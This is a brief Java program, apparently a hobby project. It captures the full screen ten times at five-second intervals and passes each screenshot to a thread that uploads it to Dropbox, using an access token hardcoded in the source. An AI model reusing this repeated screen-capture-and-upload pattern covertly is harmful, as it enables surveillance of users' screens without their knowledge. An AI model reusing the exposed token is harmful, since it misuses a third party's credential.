package main.java.ru;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.awt.*;
import java.awt.image.BufferedImage;

public class Main {

    private static final String ACCESS_TOKEN = "CvC_FpBxMloAAAAAAAAAAdzJj-4CjGlN6-L3pX0OPxlyMTn9VC95_v9Rx_JSF5Ds";

    public static void main(String[] args) {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        try {
            for (int i = 0; i < 10; i++) {
                BufferedImage bufferedImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                SendInfo sendInfo = new SendInfo(client, bufferedImage);
                sendInfo.start();
                Thread.sleep(5000);

            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}